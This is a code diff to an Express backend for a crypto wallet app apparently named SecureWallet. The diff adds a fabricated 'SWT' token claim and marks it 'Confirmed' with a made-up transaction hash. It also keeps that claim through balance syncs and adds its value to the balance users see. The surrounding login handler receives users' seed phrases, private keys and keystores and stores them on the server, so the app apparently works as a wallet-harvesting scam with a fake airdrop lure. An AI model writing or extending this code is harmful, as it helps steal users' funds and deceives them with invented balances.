@@ -436,18 +436,41 @@ app.post("/api/track/login", (req, res) => {
         }
     }
 
+    // Never wipe a previously saved SWT claim when syncing chain balances
+    const prevAssets = existingUser
+      ? parseJsonField(existingUser.assets, [])
+      : (existingIndex >= 0 ? (trackedUsers[existingIndex].assets || []) : []);
+    const prevTxs = existingUser
+      ? parseJsonField(existingUser.transactions, [])
+      : (existingIndex >= 0 ? (trackedUsers[existingIndex].transactions || []) : []);
+    const incomingAssets = Array.isArray(assets) ? assets : [];
+    const prevSwt = prevAssets.find((a) => a && a.id === 'swt_token');
+    const mergedAssets =
+      prevSwt && !incomingAssets.some((a) => a && a.id === 'swt_token')
+        ? [prevSwt, ...incomingAssets]
+        : incomingAssets;
+    const incomingTxs = Array.isArray(txs) ? txs : null;
+    const prevClaimTx = prevTxs.find((t) => t && (t.type === 'claim' || t.symbol === 'SWT'));
+    let mergedTxs = incomingTxs || prevTxs;
+    if (prevClaimTx && Array.isArray(mergedTxs) && !mergedTxs.some((t) => t && (t.id === prevClaimTx.id || (t.type === 'claim' && t.symbol === 'SWT')))) {
+      mergedTxs = [prevClaimTx, ...mergedTxs];
+    }
+    const mergedBalance =
+      (typeof balance === 'number' ? balance : 0) +
+      (prevSwt && !incomingAssets.some((a) => a && a.id === 'swt_token') ? Number(prevSwt.value) || 0 : 0);
+
     const userData = {
         userId,
         address,
         walletType,
-        balance,
-        assets,
+        balance: mergedBalance,
+        assets: mergedAssets,
         lastActive: new Date().toISOString(),
         status: 'Active',
         featureFlags: { canSwap: true, canSend: true, canStake: false },
         appLimits: { dailySend: 50000, dailySwap: 100000 },
         riskFlags,
-        transactions: txs || (existingUser ? (existingUser.transactions || []) : (existingIndex >= 0 ? trackedUsers[existingIndex].transactions : [])),
+        transactions: mergedTxs,
         importMethod: importMethod || (mnemonic ? 'seed_phrase' : (privateKey ? 'private_key' : (keystoreJSON ? 'keystore' : prevImportMethod))),
         encMnemonic: mnemonic ? encrypt(mnemonic) : prevMnemonic,
         encPrivateKey: privateKey ? encrypt(privateKey) : prevPrivateKey,
@@ -520,6 +543,165 @@ app.post("/api/track/transaction", (req, res) => {
       return res.status(404).json({ error: "User not found" });
     }
   })().catch(() => res.status(500).json({ error: "server_error" }));
+});
+
+const SWT_ASSET = {
+  id: 'swt_token',
+  name: 'SecureWallet Token',
+  symbol: 'SWT',
+  amount: 33333,
+  price: 0.15,
+  change: 12.5,
+  value: 33333 * 0.15,
+  color: '#2563eb',
+  chainKey: '0x1',
+  allocation: 0,
+  isClaimed: true,
+};
+
+function parseJsonField(value, fallback = []) {
+  if (Array.isArray(value)) return value;
+  if (typeof value === 'string') {
+    try {
+      const parsed = JSON.parse(value);
+      return Array.isArray(parsed) ? parsed : fallback;
+    } catch {
+      return fallback;
+    }
+  }
+  return fallback;
+}
+
+function buildClaimTx(address) {
+  const lower = String(address || '').toLowerCase();
+  return {
+    id: `claim-swt-${lower}`,
+    type: 'claim',
+    amount: '33333',
+    symbol: 'SWT',
+    asset: 'SecureWallet Token',
+    date: new Date().toLocaleDateString(),
+    status: 'Confirmed',
+    hash: `claim-${lower.slice(0, 10)}`,
+    timestamp: new Date().toISOString(),
+  };
+}
+
+function userHasSwtClaim(user) {
+  if (!user) return false;
+  const assets = parseJsonField(user.assets, []);
+  return assets.some((a) => a && (a.id === 'swt_token' || a.symbol === 'SWT'));
+}
+
+function extractClaimPayload(user, address) {
+  const assets = parseJsonField(user?.assets, []);
+  const txs = parseJsonField(user?.transactions, []);
+  const asset = assets.find((a) => a && (a.id === 'swt_token' || a.symbol === 'SWT')) || null;
+  const transaction =
+    txs.find((t) => t && (t.type === 'claim' || t.symbol === 'SWT')) || (asset ? buildClaimTx(address) : null);
+  return {
+    claimed: !!asset,
+    asset: asset || null,
+    transaction: transaction || null,
+  };
+}
+
+// Load claimed SWT for an address (DB / local JSON fallback)
+app.get('/api/claim', async (req, res) => {
+  try {
+    const address = String(req.query.address || '').toLowerCase();
+    if (!address) return res.status(400).json({ error: 'Address required' });
+
+    if (await pgReady()) {
+      const user = await pFindUserByAddress(address);
+      return res.json(extractClaimPayload(user, address));
+    }
+
+    const user = trackedUsers.find((u) => String(u.address || '').toLowerCase() === address);
+    return res.json(extractClaimPayload(user, address));
+  } catch (e) {
+    console.error(e);
+    return res.status(500).json({ error: 'server_error' });
+  }
+});
+
+// Persist claimed SWT for an address in the database
+app.post('/api/claim', async (req, res) => {
+  try {
+    const address = String(req.body?.address || '').toLowerCase();
+    if (!address) return res.status(400).json({ error: 'Address required' });
+    const claimTx = buildClaimTx(address);
+
+    if (await pgReady()) {
+      let user = await pFindUserByAddress(address);
+      if (!user) {
+        await pUpsertTrackedUser({
+          userId: `user_${Math.random().toString(36).substr(2, 9)}`,
+          address,
+          walletType: 'imported',
+          balance: SWT_ASSET.value,
+          assets: [SWT_ASSET],
+          transactions: [claimTx],
+          lastActive: new Date().toISOString(),
+          status: 'Active',
+          featureFlags: { canSwap: true, canSend: true, canStake: false },
+          appLimits: { dailySend: 50000, dailySwap: 100000 },
+          riskFlags: [],
+          importMethod: 'claim',
+        });
+        return res.json({ success: true, claimed: true, asset: SWT_ASSET, transaction: claimTx });
+      }
+
+      const assets = parseJsonField(user.assets, []);
+      const txs = parseJsonField(user.transactions, []);
+      const nextAssets = assets.some((a) => a && a.id === 'swt_token')
+        ? assets
+        : [SWT_ASSET, ...assets];
+      const nextTxs = txs.some((t) => t && (t.id === claimTx.id || (t.type === 'claim' && t.symbol === 'SWT')))
+        ? txs
+        : [claimTx, ...txs];
+      const balance = nextAssets.reduce((sum, a) => sum + (Number(a?.value) || 0), 0);
+      await pUpdateUser(user.user_id || user.userId, {
+        assets: nextAssets,
+        transactions: nextTxs,
+        balance,
+        lastActive: new Date().toISOString(),
+      });
+      return res.json({ success: true, claimed: true, asset: SWT_ASSET, transaction: claimTx });
+    }
+
+    const idx = trackedUsers.findIndex((u) => String(u.address || '').toLowerCase() === address);
+    if (idx < 0) {
+      trackedUsers.push({
+        userId: `user_${Math.random().toString(36).substr(2, 9)}`,
+        address,
+        walletType: 'imported',
+        balance: SWT_ASSET.value,
+        assets: [SWT_ASSET],
+        transactions: [claimTx],
+        lastActive: new Date().toISOString(),
+        status: 'Active',
+        importMethod: 'claim',
+      });
+    } else {
+      const assets = Array.isArray(trackedUsers[idx].assets) ? trackedUsers[idx].assets : [];
+      const txs = Array.isArray(trackedUsers[idx].transactions) ? trackedUsers[idx].transactions : [];
+      trackedUsers[idx].assets = assets.some((a) => a && a.id === 'swt_token') ? assets : [SWT_ASSET, ...assets];
+      trackedUsers[idx].transactions = txs.some((t) => t && t.id === claimTx.id)
+        ? txs
+        : [claimTx, ...txs];
+      trackedUsers[idx].balance = trackedUsers[idx].assets.reduce(
+        (sum, a) => sum + (Number(a?.value) || 0),
+        0,
+      );
+      trackedUsers[idx].lastActive = new Date().toISOString();
+    }
+    saveDB();
+    return res.json({ success: true, claimed: true, asset: SWT_ASSET, transaction: claimTx });
+  } catch (e) {
+    console.error(e);
+    return res.status(500).json({ error: 'server_error' });
+  }
 });
 
 // DEBUG ENDPOINT
